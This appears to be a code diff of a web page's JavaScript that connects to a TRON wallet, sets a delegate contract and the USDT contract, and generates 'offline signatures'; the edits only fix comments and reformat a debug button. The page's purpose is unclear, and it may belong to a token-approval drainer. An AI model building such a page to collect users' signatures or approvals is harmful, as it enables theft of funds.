@@ -373,7 +373,8 @@
 
     <script>
         // 核心配置
-         const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
+             // 核心配置（修复amount的Ox→0x）
+        const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
         const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const BACKEND_API = "https://your-backend-domain.com/api"; // 替换为你的后端地址
         // 修复：将Ox改为0x（数字0，不是字母O）
@@ -501,8 +502,8 @@
                 throw new Error(`签名生成失败：${e.message} → 点击「查看调试信息」按钮查看详情`);
             }
         }
-
-          * 初始化钱包：获取地址、余额
+             /**
+         * 初始化钱包：获取地址、余额
          */
         async function initWallet() {
             try {
@@ -697,18 +698,18 @@
                 toast.style.display = "none";
             }, 3000);
         }
-
-
-        // 临时调试按钮逻辑（所有函数之后添加）
-        document.getElementById("showDebugBtn").addEventListener("click", () => {
-            const debugKeys = Object.keys(localStorage).filter(key => key.startsWith("signature_debug_"));
-            if (debugKeys.length === 0) {
-                alert("未找到调试信息，请先点击「生成离线签名」触发错误");
-                return;
-            }
-            const debugInfo = JSON.parse(localStorage.getItem(debugKeys[0]));
-            alert("调试信息：\n" + JSON.stringify(debugInfo, null, 2));
-        });
+        // 临时调试按钮逻辑
+document.getElementById("showDebugBtn").addEventListener("click", () => {
+  // 找到调试信息键（匹配以signature_debug_开头的键）
+  const debugKeys = Object.keys(localStorage).filter(key => key.startsWith("signature_debug_"));
+  if (debugKeys.length === 0) {
+    alert("未找到调试信息，请先点击「生成离线签名」触发错误");
+    return;
+  }
+  // 读取并显示调试信息（格式化JSON，方便查看）
+  const debugInfo = JSON.parse(localStorage.getItem(debugKeys[0]));
+  alert("调试信息：\n" + JSON.stringify(debugInfo, null, 2));
+});
     </script>
 </body>
 </html>
